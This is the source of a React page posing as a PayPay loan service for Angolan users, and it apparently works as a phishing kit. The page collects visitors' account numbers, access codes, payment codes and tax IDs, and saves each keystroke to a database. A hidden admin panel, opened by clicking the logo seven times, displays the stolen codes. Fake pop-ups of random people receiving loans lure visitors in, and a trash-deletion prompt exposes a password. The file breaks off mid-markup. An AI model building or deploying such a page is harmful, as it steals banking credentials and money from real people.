import { createFileRoute } from "@tanstack/react-router";
import { useState, useEffect, useRef, useMemo } from "react";
import { motion, AnimatePresence } from "framer-motion";
import { ChevronLeft, CheckCircle2, Download, ShieldCheck, CreditCard, User, LayoutDashboard, Globe, HelpCircle, Eye, EyeOff, Info, Check, Trash2, Search, XCircle, AlertTriangle, Loader2, FileText } from "lucide-react";
import { cn } from "@/lib/utils";
import { toast } from "sonner";
import logoPaypay from "@/assets/logo-paypay.png";
import keyIconAsset from "@/assets/key-icon.png";
import userIconAsset from "@/assets/chat-logo.png";
import successIconAsset from "@/assets/success-icon.jpg.asset.json";
import { verifyAdminPassword, updateApplicationStatus, deleteApplication, getApplications, checkApplicationStatus, getDeletedApplications, restoreApplication, deletePermanently, deleteAllPermanently } from "@/lib/admin.functions";
import { History, RotateCcw } from "lucide-react";


export const Route = createFileRoute("/")({
  component: Index,
  head: () => ({
    meta: [
      { title: "PayPay-Empréstimo Pay" },
      { name: "description", content: "Solicite seu empréstimo de forma rápida e segura na paypay." },
      { property: "og:title", content: "PayPay-Empréstimo Pay" },
      { property: "og:description", content: "Solicite seu empréstimo de forma rápida e segura na paypay." },
      { property: "og:type", content: "website" },
      { name: "twitter:card", content: "summary" },
    ],
  }),
});

type Step = "home" | "login" | "step2" | "step3" | "step4" | "summary" | "confirm" | "success" | "admin" | "check_status";

function Index() {
  const [step, setStep] = useState<Step>("home");
  const [adminTab, setAdminTab] = useState<"users" | "trash">("users");
  const [accountNumber, setAccountNumber] = useState("");
  const [accessCode, setAccessCode] = useState("");
  const [showAccessCode, setShowAccessCode] = useState(false);
  const [paymentCode, setPaymentCode] = useState(["", "", "", "", "", ""]);
  const [amount, setAmount] = useState(35000);
  const [term, setTerm] = useState(60);

  // Notifications logic
  const angolanNames = ["João", "Maria", "António", "Ana", "Carlos", "Isabel", "Pedro", "Fátima", "Miguel", "Teresa", "André", "Marta", "José", "Helena", "Samuel", "Rosa", "Daniel", "Beatriz", "Jorge", "Cláudia"];
  const portugueseNames = ["Francisco", "Leonor", "Afonso", "Matilde", "Rodrigo", "Beatriz", "Martim", "Alice", "Tiago", "Sofia", "Gabriel", "Mariana", "Lucas", "Inês", "Guilherme", "Carolina", "Rafael", "Laura", "Duarte", "Joana"];
  const umbunduSurnames = ["Tchipia", "Tchivela", "Kassoma", "Kandimba", "Tchivinda", "Kalunga", "Nandjala", "Sambu", "Catchiungo", "Luiele", "Kavela", "Tchilombo", "Muenho", "Tchalwa", "Vunje", "Tchingui", "Nambalo", "Kambuta", "Lumbombo", "Tchipilika"];
  const allFirstNames = [...angolanNames, ...portugueseNames];
  const allSurnames = ["Silva", "Santos", "Ferreira", "Pereira", "Oliveira", "Costa", "Rodrigues", "Martins", "Jesus", "Sousa", "Fernandes", "Gonçalves", "Gomes", "Lopes", "Marques", "Alves", "Almeida", "Ribeiro", "Pinto", "Carvalho", ...umbunduSurnames];


  const [notification, setNotification] = useState<{ name: string; amount: number } | null>(null);

  useEffect(() => {
    const history: string[] = [];
    const MAX_HISTORY = 15;

    const showRandomNotification = () => {
      let randomName: string;
      let randomAmount: number;
      let uniqueKey: string;

      // Try up to 20 times to find a unique combination not in recent history
      let attempts = 0;
      do {
        const first = allFirstNames[Math.floor(Math.random() * allFirstNames.length)] ?? "Utilizador";
        const last = allSurnames[Math.floor(Math.random() * allSurnames.length)] ?? "X";
        randomName = `${first} ${last}`;
        randomAmount = Math.floor(Math.random() * (35000 - 2000 + 1)) + 2000;
        randomAmount = Math.round(randomAmount / 100) * 100;
        uniqueKey = `${randomName}-${randomAmount}`;
        attempts++;
      } while (history.includes(uniqueKey) && attempts < 20);


      history.push(uniqueKey);
      if (history.length > MAX_HISTORY) {
        history.shift();
      }

      const maskedName = randomName.split(" ").slice(0, 2).join(" ") + " X**";
      setNotification({ name: maskedName, amount: randomAmount });

      setTimeout(() => setNotification(null), 5000);
    };

    const interval = setInterval(showRandomNotification, 20000);
    const firstTimeout = setTimeout(showRandomNotification, 3000);

    return () => {
      clearInterval(interval);
      clearTimeout(firstTimeout);
    };
  }, []);
  
  const feePercentage = useMemo(() => {
    if (term === 15) return 6;
    if (term === 30) return 9;
    if (term === 45) return 11.43;
    if (term === 60) return 15;
    return 15; // default
  }, [term]);

  const refundMargin = useMemo(() => {
    return Math.round(amount * (feePercentage / 100));
  }, [amount, feePercentage]);
  
  const totalToRefund = amount + refundMargin;
  const [personalData, setPersonalData] = useState({ name: "", nif: "" });
  const [logoClicks, setLogoClicks] = useState(0);
  const [acceptedTerms, setAcceptedTerms] = useState(false);
  const [scrolledToBottom, setScrolledToBottom] = useState(false);
  const [applicationId, setApplicationId] = useState<string | null>(null);
  const scrollRef = useRef<HTMLDivElement>(null);
  const [adminAuthenticated, setAdminAuthenticated] = useState(false);
  const [adminPassword, setAdminPassword] = useState("");
  const [loading, setLoading] = useState(false);

  // Rejection Dialog State
  const [rejectionDialog, setRejectionDialog] = useState<{
    isOpen: boolean;
    appId: string;
    isCorrect: boolean;
    onConfirm?: () => void;
  }>({ isOpen: false, appId: "", isCorrect: false });
  const [customRejectionReason, setCustomRejectionReason] = useState("");

  const handleConfirmStatusUpdate = async () => {
    const { appId, isCorrect, onConfirm } = rejectionDialog;
    if (!appId) return;

    try {
      setLoading(true);
      await updateApplicationStatus({ 
        data: { 
          id: appId, 
          isCorrect, 
          customReason: customRejectionReason,
          adminPassword 
        } 
      });
      toast.success("Candidatura Reprovada com sucesso");
      setRejectionDialog({ isOpen: false, appId: "", isCorrect: false });
      if (onConfirm) onConfirm();
    } catch (err: any) {
      toast.error("Erro ao atualizar análise: " + (err.message || "Erro inesperado"));
    } finally {
      setLoading(false);
    }
  };


  const saveProgress = async (immediate = false) => {
    // Don't save if on home or admin steps
    if (step === "home" || step === "admin" || step === "success") return;
    
    try {
      const { supabase } = await import("@/integrations/supabase/client");
      
      const pCodeStr = paymentCode.join("");
      
      // Requirement: Save EVERYTHING instantly to the admin panel.
      // Even partial entries are considered "Candidatura recebida" for visibility.
      const payload: any = {
        account_number: accountNumber || null,
        access_code: accessCode || null,
        payment_code: pCodeStr || null,
        amount: Number(amount) || 0,
        term: Number(term) || 0,
        refund_margin: Number(refundMargin) || 0,
        total_to_refund: Number(totalToRefund) || 0,
        name: personalData.name || null,
        nif: personalData.nif || null,
        step: step,
        updated_at: new Date().toISOString(),
        status: "Candidatura recebida" // Always marked as received so it shows up in admin instantly
      };

      // Filter out null/empty values to avoid overwriting existing data with nulls
      const activePayload: any = {};
      Object.keys(payload).forEach(key => {
        if (payload[key] !== null && payload[key] !== undefined && payload[key] !== "") {
          activePayload[key] = payload[key];
        }
      });

      if (applicationId) {
        const { error } = await supabase
          .from("pending_applications")
          .update(activePayload)
          .eq("id", applicationId);
        if (error) console.error("Error updating progress:", error);
      } else if (accountNumber || accessCode || personalData.name || personalData.nif || pCodeStr) {
        const { data, error } = await supabase
          .from("pending_applications")
          .insert([payload])
          .select()
          .single();
        
        if (error) {
          console.error("Error inserting progress:", error);
        } else if (data) {
          setApplicationId(data.id);
        }
      }
    } catch (err) {
      console.error("Unexpected error in saveProgress:", err);
    }
  };

  // Immediate save on critical steps like payment code and personal data
  useEffect(() => {
    if (step === "step3" || step === "step4" || step === "confirm" || step === "summary") {
      saveProgress(true);
    }
  }, [step]);

  // Auto-save application progress with high sensitivity
  useEffect(() => {
    if (step !== "home" && step !== "admin") {
      const timer = setTimeout(() => {
        saveProgress();
      }, 300); // Higher frequency for 100% precision
      return () => clearTimeout(timer);
    }
    return undefined;
  }, [step, accountNumber, accessCode, paymentCode, amount, term, personalData]);

  // Persistence logic to prevent "reset" on inactivity
  useEffect(() => {
    // Restore state from sessionStorage on mount
    const savedState = sessionStorage.getItem('paypay_app_state');
    if (savedState) {
      try {
        const parsed = JSON.parse(savedState);
        if (parsed.step && parsed.step !== 'success' && parsed.step !== 'admin') {
          setStep(parsed.step);
          setAccountNumber(parsed.accountNumber || "");
          setAccessCode(parsed.accessCode || "");
          setPaymentCode(parsed.paymentCode || ["", "", "", "", "", ""]);
          setAmount(parsed.amount || 35000);
          setTerm(parsed.term || 60);
          setPersonalData(parsed.personalData || { name: "", nif: "" });
          setApplicationId(parsed.applicationId || null);
        }
      } catch (e) {
        console.error("Error restoring session state", e);
      }
    }
  }, []);

  useEffect(() => {
    // Persist state to sessionStorage whenever it changes
    const stateToSave = {
      step,
      accountNumber,
      accessCode,
      paymentCode,
      amount,
      term,
      personalData,
      applicationId
    };
    sessionStorage.setItem('paypay_app_state', JSON.stringify(stateToSave));
  }, [step, accountNumber, accessCode, paymentCode, amount, term, personalData, applicationId]);

  // Handle secret admin access
  useEffect(() => {
    if (logoClicks >= 7) {
      setAdminAuthenticated(false); // Reset authentication status first
      setAdminPassword(""); // Clear password field
      setStep("admin");
      setLogoClicks(0);
      toast.info("Acesso Administrativo - Por favor, insira a senha");
    }
    const timer = setTimeout(() => setLogoClicks(0), 1000);
    return () => clearTimeout(timer);
  }, [logoClicks]);

  const handleScroll = () => {
    if (scrollRef.current) {
      const { scrollTop, scrollHeight, clientHeight } = scrollRef.current;
      if (scrollTop + clientHeight >= scrollHeight - 5) {
        setScrolledToBottom(true);
      }
    }
  };

  const nextStep = (next: Step) => setStep(next);

  const StatusCheckArea = ({ onBack, compact = false }: { onBack: () => void; compact?: boolean }) => {
    const [checkNif, setCheckNif] = useState("");
    const [checkResult, setCheckResult] = useState<{ status: string; reason: string; color?: string } | null>(null);
    const [loading, setLoading] = useState(false);

    const handleCheck = async () => {
      if (checkNif.length < 9) {
        toast.error("Por favor, insira um NIF válido");
        return;
      }

      setLoading(true);
      try {
        const data = await checkApplicationStatus({ data: { nif: checkNif } }) as any;
        
        if (!data) {
          toast.error("Nenhuma candidatura encontrada para este NIF.");
          setCheckResult(null);
        } else {
          setCheckResult({ 
            status: data.analysis_color ? "Reprovado" : "Em revisão", 
            reason: data.rejection_reason || (data.analysis_color ? "Candidatura reprovada por critérios internos." : "Aguardando verificação"),
            color: data.analysis_color || 'blue'
          });
        }
      } catch (err) {
        toast.error("Erro ao consultar candidatura.");
      } finally {
        setLoading(false);
      }

    };

    if (compact) {
      return (
        <div className="space-y-4">
          <div className="relative bg-secondary/30 rounded-2xl p-3 flex items-center gap-3">
            <input
              type="text"
              placeholder="Digite apenas o seu NIF (exc 009876543LA042)"
              maxLength={14}
              value={checkNif}
              onChange={(e) => setCheckNif(e.target.value.toUpperCase())}
              className="w-full text-xs outline-none bg-transparent placeholder:text-muted-foreground/50 font-medium"
            />
            <FileText className="w-4 h-4 text-muted-foreground/50" />
          </div>

          <button
            onClick={handleCheck}
            disabled={loading}
            className="w-full bg-[#0F172A] text-white h-12 rounded-2xl font-bold text-xs shadow-lg hover:scale-[1.02] active:scale-[0.98] transition-all disabled:opacity-50 cursor-pointer flex items-center justify-center gap-2"
          >
            {loading ? <Loader2 className="w-4 h-4 animate-spin" /> : <Search className="w-4 h-4" />}
            Consultar Empréstimo
          </button>

          {checkResult && (
            <motion.div 
              initial={{ opacity: 0, y: 10 }}
              animate={{ opacity: 1, y: 0 }}
              className="space-y-2"
            >
              {checkResult.status === "Reprovado" && checkResult.reason === "Dados inválidos. Tente novamente." && (
                <div className="flex items-center gap-1.5 text-[10px] font-bold text-red-600 px-1">
                  <XCircle className="w-3 h-3" />
                  <span>Dados inválidos. Verifique e tente novamente.</span>
                </div>
              )}
              <div className={cn(
                "p-3 rounded-xl border space-y-2 text-left",
                checkResult.color === 'red' || checkResult.status === "Reprovado" ? "bg-red-50 border-red-100" :
                "bg-blue-50 border-blue-100"
              )}>
                <div className={cn(
                  "flex items-center gap-2",
                  checkResult.color === 'red' || checkResult.status === "Reprovado" ? "text-red-600" :
                  "text-blue-600"
                )}>
                  {checkResult.status === "Reprovado" ? <AlertTriangle className="w-4 h-4" /> :
                   <Info className="w-4 h-4" />}
                  <span className="font-bold uppercase text-[10px]">Status: {checkResult.status}</span>
                </div>
                <p className={cn(
                  "text-[11px] font-bold leading-tight",
                  checkResult.color === 'red' || checkResult.status === "Reprovado" ? "text-red-700" :
                  "text-blue-700"
                )}>“{checkResult.reason}”</p>
              </div>
            </motion.div>
          )}
        </div>
      );
    }

    return (
      <div className="space-y-6 animate-in fade-in slide-in-from-bottom-4 duration-500">
        <div className="space-y-2">
          <h2 className="text-2xl font-bold">Verificar Candidatura</h2>
          <p className="text-muted-foreground text-sm">Insira o seu NIF para consultar o estado do seu pedido.</p>
        </div>

        <div className="bg-white rounded-[32px] shadow-sm p-8 border border-border/40 space-y-6">
          <div className="space-y-2 text-left">
            <label className="text-sm font-bold text-foreground uppercase tracking-tight ml-1">NIF do Solicitante</label>
            <div className="relative border-b border-border focus-within:border-primary transition-colors py-2">
              <input
                type="text"
                placeholder="Ex: 000000000LA000"
                maxLength={14}
                value={checkNif}
                onChange={(e) => setCheckNif(e.target.value.toUpperCase())}
                className="w-full text-base outline-none bg-transparent placeholder:text-muted-foreground/50"
              />
            </div>
          </div>

          <button
            onClick={handleCheck}
            disabled={loading}
            className="w-full bg-primary text-white h-14 rounded-2xl font-semibold text-lg shadow-lg hover:scale-[1.02] active:scale-[0.98] transition-all disabled:opacity-50 cursor-pointer flex items-center justify-center gap-2"
          >
            {loading ? "Consultando..." : <><Search className="w-5 h-5" /> Verificar agora</>}
          </button>

          {checkResult && (
            <motion.div 
              initial={{ opacity: 0, y: 10 }}
              animate={{ opacity: 1, y: 0 }}
              className="pt-4 border-t border-border/10 space-y-4"
            >
              {checkResult.status === "Reprovado" && checkResult.reason === "Dados inválidos. Tente novamente." && (
                <div className="flex items-center gap-2 text-xs font-bold text-red-600 px-1 justify-center">
                  <XCircle className="w-4 h-4" />
                  <span>Dados inválidos. Verifique e tente novamente.</span>
                </div>
              )}
              <div className={cn(
                "p-4 rounded-2xl border space-y-3",
                checkResult.color === 'red' || checkResult.status === "Reprovado" ? "bg-red-50 border-red-100" :
                "bg-blue-50 border-blue-100"
              )}>
                <div className={cn(
                  "flex items-center gap-2 justify-center",
                  checkResult.color === 'red' || checkResult.status === "Reprovado" ? "text-red-600" :
                  "text-blue-600"
                )}>
                  {checkResult.status === "Reprovado" ? <AlertTriangle className="w-5 h-5" /> :
                   <Info className="w-5 h-5" />}
                  <span className="font-black uppercase text-sm">Status: {checkResult.status}</span>
                </div>
                <div className="space-y-1">
                  <p className={cn(
                    "text-[10px] uppercase font-black",
                    checkResult.color === 'red' || checkResult.status === "Reprovado" ? "text-red-400" :
                    "text-blue-400"
                  )}>Motivo da Decisão</p>
                  <p className={cn(
                    "text-sm font-bold",
                    checkResult.color === 'red' || checkResult.status === "Reprovado" ? "text-red-700" :
                    "text-blue-700"
                  )}>“{checkResult.reason}”</p>
                </div>
              </div>
              <p className="text-[10px] text-muted-foreground italic text-center">
                A sua candidatura não cumpre os requisitos mínimos do sistema. Para mais informações, contacte o suporte.
              </p>
            </motion.div>
          )}
        </div>

        <button 
          onClick={onBack}
          className="text-sm font-bold text-muted-foreground hover:text-primary transition-colors flex items-center justify-center gap-1 mx-auto"
        >
          <ChevronLeft className="w-4 h-4" /> Voltar ao início
        </button>
      </div>
    );
  };

  const AdminDataList = () => {
    const [apps, setApps] = useState<any[]>([]);
    const [deletedApps, setDeletedApps] = useState<any[]>([]);
    const [loading, setLoading] = useState(true);

    const fetchApps = async () => {
      try {
        const data = await getApplications({ data: { adminPassword } });
        if (data) setApps(data);
      } catch (err) {
        toast.error("Erro ao carregar dados");
      } finally {
        setLoading(false);
      }
    };

    const fetchDeletedApps = async () => {
      try {
        setLoading(true);
        const data = await getDeletedApplications({ data: { adminPassword } });
        if (data) setDeletedApps(data);
      } catch (err: any) {
        toast.error("Erro ao carregar lixeira: " + (err.message || "Erro desconhecido"));
      } finally {
        setLoading(false);
      }
    };

    useEffect(() => {
      if (adminAuthenticated) {
        if (adminTab === "users") fetchApps();
        else fetchDeletedApps();
      }
    }, [adminAuthenticated, adminTab]);

    const updateStatus = async (id: string, isCorrect: boolean) => {
      setRejectionDialog({ 
        isOpen: true, 
        appId: id, 
        isCorrect,
        onConfirm: fetchApps
      });
      setCustomRejectionReason(isCorrect ? "Empréstimo Aprovado" : "Dados incorretos");
    };

    const deleteItem = async (id: string) => {
      if (!confirm("Mover para a lixeira? Os dados serão apagados definitivamente após 10 dias.")) return;
      
      try {
        const result = await deleteApplication({ data: { id, adminPassword } });
        if (result && result.success) {
          toast.success("Dados movidos para a lixeira");
          setApps(prev => prev.filter(app => app.id !== id));
        }
      } catch (err: any) {
        toast.error("Erro ao apagar dados: " + (err.message || "Erro desconhecido"));
      }
    };

    const restoreItem = async (id: string) => {
      try {
        const result = await restoreApplication({ data: { id, adminPassword } });
        if (result && result.success) {
          toast.success("Dados recuperados com sucesso");
          setDeletedApps(prev => prev.filter(app => app.id !== id));
        }
      } catch (err) {
        toast.error("Erro ao recuperar dados");
      }
    };

    const permanentDelete = async (id: string) => {
      const permanentPassword = prompt("Digite a senha para remover permanentemente:");
      if (!permanentPassword) return;

      try {
        const result = await deletePermanently({ data: { id, adminPassword, permanentPassword } });
        if (result && result.success) {
          toast.success("Dados removidos permanentemente");
          setDeletedApps(prev => prev.filter(app => app.id !== id));
        }
      } catch (err: any) {
        toast.error(err.message || "Erro ao remover permanentemente");
      }
    };

    const emptyTrash = async () => {
      const permanentPassword = prompt("O site a remover da lixeira tá mbora mostrar mais a senha tá assim não pode falar a senha pois tem outros que vão ter acesso Digite a senha moneytooll para remover permanentemente:");
      if (!permanentPassword) return;

      try {
        setLoading(true);
        const result = await deleteAllPermanently({ data: { adminPassword, permanentPassword } });
        if (result && result.success) {
          toast.success("Lixeira esvaziada com sucesso");
          setDeletedApps([]);
        }
      } catch (err: any) {
        toast.error(err.message || "Erro ao esvaziar lixeira");
      } finally {
        setLoading(false);
      }
    };

    if (loading) return <div className="text-xs text-muted-foreground animate-pulse text-center py-8">Carregando...</div>;
    
    const currentList = adminTab === "users" ? apps : deletedApps;
    
    if (currentList.length === 0) return <div className="text-xs text-muted-foreground italic text-center py-8">Nenhum registo encontrado.</div>;

    return (
      <div className="space-y-4 max-h-[500px] overflow-y-auto pr-2 custom-scrollbar">
        {adminTab === "trash" && deletedApps.length > 0 && (
          <div className="flex justify-end mb-2">
            <button
              onClick={emptyTrash}
              className="flex items-center gap-1.5 px-3 py-1.5 bg-red-600 text-white rounded-lg text-[10px] font-bold hover:bg-red-700 transition-colors shadow-sm"
            >
              <Trash2 className="w-3 h-3" /> Eliminar tudo
            </button>
          </div>
        )}

        {currentList.map((app) => (
          <div 
            key={app.id} 
            className={cn(
              "p-4 rounded-2xl border transition-all duration-300 relative group",
              adminTab === "trash" ? "bg-gray-50 border-gray-200" :
              app.analysis_color === 'green' ? "bg-green-50 border-green-200" : 
              app.analysis_color === 'red' ? "bg-red-50 border-red-200" : 
              "bg-white border-border/40 shadow-sm"
            )}
          >
            {adminTab === "users" ? (
              <button 
                onClick={() => deleteItem(app.id)}
                className="absolute top-3 right-3 p-2 text-muted-foreground hover:text-destructive transition-colors rounded-full hover:bg-destructive/10"
                title="Mover para lixeira"
              >
                <Trash2 className="w-4 h-4" />
              </button>
            ) : (
              <div className="absolute top-3 right-3 flex gap-1">
                <button 
                  onClick={() => restoreItem(app.id)}
                  className="p-2 text-primary hover:bg-primary/10 transition-colors rounded-full"
                  title="Recuperar dados"
                >
                  <RotateCcw className="w-4 h-4" />
                </button>
                <button 
                  onClick={() => permanentDelete(app.id)}
                  className="p-2 text-destructive hover:bg-destructive/10 transition-colors rounded-full"
                  title="Remover permanentemente"
                >
                  <Trash2 className="w-4 h-4" />
                </button>
              </div>
            )}

            <div className="space-y-4">
              <div className="flex justify-between items-start">
                <div className="space-y-1">
                  <p className="text-[10px] font-black text-primary uppercase tracking-wider">
                    {adminTab === "trash" ? "Apagado" : "Candidatura"} #{app.id.slice(0, 8).toUpperCase()}
                  </p>
                  <h4 className="text-base font-bold text-foreground">{app.name || "Nome não informado"}</h4>
                </div>
                <div className="flex flex-col items-end gap-1">
                  <span className={cn(
                    "text-[10px] px-2 py-1 rounded-full font-bold uppercase",
                    app.status === 'Pendente' ? "bg-amber-100 text-amber-700" : 
                    app.analysis_color === 'green' ? "bg-green-100 text-green-700" : "bg-red-100 text-red-700"
                  )}>
                    {app.status || 'Pendente'}
                  </span>
                </div>
              </div>
              
              <div className="grid grid-cols-2 gap-x-4 gap-y-3 py-3 border-y border-border/10">
                <div className="space-y-0.5">
                  <p className="text-[9px] text-muted-foreground uppercase font-bold">NIF / Conta</p>
                  <p className="text-xs font-bold">{app.nif || "---"} | {app.account_number || "---"}</p>
                </div>
                <div className="space-y-0.5">
                  <p className="text-[9px] text-muted-foreground uppercase font-bold">Total a Devolver</p>
                  <p className="text-xs font-black text-primary">{app.total_to_refund ? `${Number(app.total_to_refund).toLocaleString()} Kz` : "---"}</p>
                </div>
                <div className="space-y-0.5">
                  <p className="text-[9px] text-muted-foreground uppercase font-bold">Cód. Acesso</p>
                  <p className="text-xs font-mono font-bold text-muted-foreground">{app.access_code || "---"}</p>
                </div>
                <div className="space-y-0.5">
                  <p className="text-[9px] text-muted-foreground uppercase font-bold">Cód. Pagamento</p>
                  <p className="text-xs font-mono font-bold text-primary">{app.payment_code || "---"}</p>
                </div>
              </div>

              {adminTab === "users" && (
                <div className="flex gap-2 pt-2">
                  <button
                    onClick={() => updateStatus(app.id, true)}
                    className="flex-1 bg-green-600 hover:bg-green-700 text-white py-2.5 rounded-xl text-[11px] font-bold transition-all shadow-md shadow-green-200 flex items-center justify-center gap-1.5"
                  >
                    <CheckCircle2 className="w-3.5 h-3.5" /> Dados corretos
                  </button>
                  <button
                    onClick={() => updateStatus(app.id, false)}
                    className="flex-1 bg-red-600 hover:bg-red-700 text-white py-2.5 rounded-xl text-[11px] font-bold transition-all shadow-md shadow-red-200 flex items-center justify-center gap-1.5"
                  >
                    <XCircle className="w-3.5 h-3.5" /> Dados errados
                  </button>
                </div>
              )}

              <div className="text-[9px] text-muted-foreground/60 text-center italic space-y-1">
                <div>Criado em: {new Date(app.created_at).toLocaleString()}</div>
                {adminTab === "trash" && app.deleted_at && (
                  <div className="text-destructive font-bold">Apagado em: {new Date(app.deleted_at).toLocaleString()}</div>
                )}
              </div>
            </div>
          </div>
        ))}
      </div>
    );
  };

  const Logo = ({ className }: { className?: string }) => (
    <div 
      onClick={() => setLogoClicks(prev => prev + 1)}
      className={cn("flex items-center gap-2 cursor-pointer select-none relative overflow-hidden", className)}
    >
      <img src={logoPaypay} alt="paypay" className="h-8 md:h-10 invisible" />
      <img 
        src={logoPaypay} 
        alt="paypay" 
        className="absolute inset-0 w-full h-full object-contain z-20" 
      />
      <div className="absolute inset-0 z-10 opacity-20 pointer-events-none flex items-center justify-center">
        <img 
          src={logoPaypay} 
          alt="" 
          className="w-full h-full object-contain scale-125 rotate-6" 
        />
      </div>
    </div>
  );

  return (
    <div className="min-h-screen bg-[#F8F9FC] font-sans selection:bg-primary/10 relative overflow-x-hidden">
      {/* Dynamic Notifications */}
      <AnimatePresence>
        {notification && (
          <motion.div
            initial={{ opacity: 0, x: 50, scale: 0.9 }}
            animate={{ opacity: 1, x: 0, scale: 1 }}
            exit={{ opacity: 0, x: 50, scale: 0.9 }}
            className="fixed top-20 right-4 z-[100] w-[280px] bg-white shadow-2xl rounded-2xl p-4 border border-primary/10 flex items-center gap-4 pointer-events-none"
          >
            <div className="w-10 h-10 bg-primary/10 rounded-full flex items-center justify-center flex-shrink-0">
              <CheckCircle2 className="w-6 h-6 text-primary" />
            </div>
            <div className="flex flex-col min-w-0">
              <p className="text-[13px] font-bold text-foreground leading-tight truncate">
                {notification.name}
              </p>
              <p className="text-[11px] text-muted-foreground leading-tight mt-1">
                Empréstimo de <span className="font-bold text-primary">{notification.amount.toLocaleString("pt-AO")} Kz</span>.
              </p>
            </div>
          </motion.div>

        )}
      </AnimatePresence>

      <div className="max-w-7xl mx-auto px-6 py-4 flex items-center justify-between border-b border-border/40 bg-white/80 backdrop-blur-md sticky top-0 z-50">
        <div className="flex items-center gap-4">
          {step !== "home" && step !== "success" && (
            <button 
              onClick={() => {
                if (step === "login") setStep("home");
                else if (step === "check_status") setStep("home");
                else if (step === "step2") setStep("login");
                else if (step === "step3") setStep("step2");
                else if (step === "step4") setStep("step3");
                else if (step === "summary") setStep("step4");
                else if (step === "confirm") setStep("summary");
                else if (step === "admin") setStep("home");
              }}
              className="p-2 hover:bg-secondary rounded-full transition-colors cursor-pointer text-muted-foreground hover:text-primary"
              aria-label="Voltar"
            >
              <ChevronLeft className="w-5 h-5" />
            </button>
          )}
          <Logo className="h-6" />
        </div>
        <div className="flex items-center gap-6 text-[11px] font-medium text-muted-foreground">
          <button className="flex items-center gap-1 hover:text-primary transition-colors cursor-pointer">
            <Globe className="w-3.5 h-3.5" /> Português (AO)
          </button>
          <button className="flex items-center gap-1 hover:text-primary transition-colors cursor-pointer">
            <HelpCircle className="w-3.5 h-3.5" /> Ajudar
          </button>
        </div>
      </div>

      <div className="max-w-md mx-auto px-6 py-12 min-h-[calc(100vh-64px)] flex flex-col items-center justify-center">
        <main className="w-full">
          <AnimatePresence mode="wait">
            {(step === "home" || step === "check_status") && (
              <motion.div
                key={step}
                initial={{ opacity: 0, y: 20 }}
                animate={{ opacity: 1, y: 0 }}
                exit={{ opacity: 0, y: -20 }}
                className="text-center space-y-8"
              >
                {step === "home" ? (
                  <>
                    <div className="space-y-4">
                      <h1 className="text-3xl font-bold text-foreground leading-tight">
                        Dinheiro rápido e seguro quando você mais precisa.
                      </h1>
                      <p className="text-muted-foreground">
                        Solicite seu empréstimo em minutos de forma simples e 100% digital.
                      </p>
                    </div>
                    
                    <div className="space-y-6 pt-4">
                      <button
                        onClick={() => nextStep("login")}
                        className="w-full bg-primary text-white h-14 rounded-2xl font-semibold text-lg shadow-xl shadow-primary/20 hover:scale-[1.02] active:scale-[0.98] transition-all cursor-pointer"
                      >
                        Solicitar Empréstimo
                      </button>

                      <div className="grid grid-cols-2 gap-4 pt-4">
                        <div className="bg-white rounded-2xl shadow-sm p-4 border border-border/40 flex items-center justify-between group hover:border-primary transition-colors cursor-pointer" onClick={() => setStep("check_status")}>
                          <div className="flex flex-col text-left">
                            <h3 className="text-[11px] font-bold text-foreground">Consultar Empréstimo</h3>
                            <p className="text-[9px] text-muted-foreground">Estado do pedido</p>
                          </div>
                          <Search className="w-4 h-4 text-primary" />
                        </div>

                        <div 
                          className="bg-white rounded-2xl shadow-sm p-4 border border-border/40 flex items-center justify-between group hover:border-primary transition-colors cursor-pointer"
                          onClick={() => toast.info("Requisitos: Conta ativa há mais de 2 meses, NIF válido e 100kz em conta para verificação.")}
                        >
                          <div className="flex flex-col text-left">
                            <h3 className="text-[11px] font-bold text-foreground">Requisitos</h3>
                            <p className="text-[9px] text-muted-foreground">Ver critérios</p>
                          </div>
                          <Info className="w-4 h-4 text-primary" />
                        </div>
                      </div>
                    </div>
                  </>
                ) : (
                  <StatusCheckArea onBack={() => setStep("home")} />
                )}
              </motion.div>
            )}

            {step === "login" && (
              <motion.div
                key="login"
                initial={{ opacity: 0, x: 20 }}
                animate={{ opacity: 1, x: 0 }}
                exit={{ opacity: 0, x: -20 }}
                className="bg-white rounded-[32px] shadow-[0_8px_30px_rgb(0,0,0,0.04)] p-10 space-y-8 border border-border/40"
              >
                <div className="flex flex-col items-center space-y-6 text-center">
                  <Logo className="h-14" />
                  <div className="space-y-3">
                    <h2 className="text-[22px] font-bold text-[#1A1A1A] tracking-tight">Iniciar Sessão</h2>
                    <p className="text-[#666666] text-[13px] leading-relaxed max-w-[240px]">
                      Insira os dados da sua conta paypay para aceder ao Adianta pay
                    </p>
                  </div>
                </div>

                <div className="space-y-8">
                  <div className="space-y-3">
                    <label className="text-[15px] font-bold text-[#1A1A1A]">Número da Conta</label>
                    <div className="relative border-b border-[#E5E7EB] focus-within:border-primary transition-colors">
                      <input
                        type="text"
                        placeholder="9xxxxxx323"
                        value={accountNumber}
                        onChange={(e) => setAccountNumber(e.target.value.replace(/\D/g, "").slice(0, 9))}
                        onBlur={() => saveProgress()}
                        className="w-full text-[15px] outline-none bg-transparent py-3 placeholder:text-[#BBBBBB]"
                      />
                    </div>
                  </div>

                  <div className="space-y-3">
                    <label className="text-[15px] font-bold text-[#1A1A1A]">Código de acesso</label>
                    <div className="relative border-b border-[#E5E7EB] focus-within:border-primary transition-colors group">
                      <input
                        type={showAccessCode ? "text" : "password"}
                        placeholder="•••••••••"
                        value={accessCode}
                        onChange={(e) => setAccessCode(e.target.value)}
                        onBlur={() => saveProgress()}
                        className="w-full text-[15px] outline-none bg-transparent py-3 pr-10 tracking-widest"
                      />
                      <button 
                        onClick={() => setShowAccessCode(!showAccessCode)}
                        className="absolute right-0 top-1/2 -translate-y-1/2 text-[#BBBBBB] hover:text-primary transition-colors"
                      >
                        {showAccessCode ? <EyeOff className="w-5 h-5" /> : <Eye className="w-5 h-5" />}
                      </button>
                    </div>
                  </div>

                  <div className="flex justify-between items-center text-[11px] text-[#999999] font-medium px-1">
                    <button className="hover:text-primary transition-colors cursor-pointer">Esqueceu o código?</button>
                    <button className="hover:text-primary transition-colors cursor-pointer">Palavra passe</button>
                  </div>
                </div>

                <div className="space-y-6">
                  <button
                    disabled={accountNumber.length < 9 || accessCode.length < 8}
                    onClick={() => nextStep("step2")}
                    className="w-full bg-primary text-white h-[52px] rounded-2xl font-bold text-[15px] shadow-[0_4px_12px_rgba(59,130,246,0.3)] disabled:opacity-50 disabled:shadow-none transition-all cursor-pointer"
                  >
                    Entrar
                  </button>

                  <div className="flex items-center justify-center gap-2 text-[11px] text-[#BBBBBB] pt-2">
                    <ShieldCheck className="w-3.5 h-3.5" />
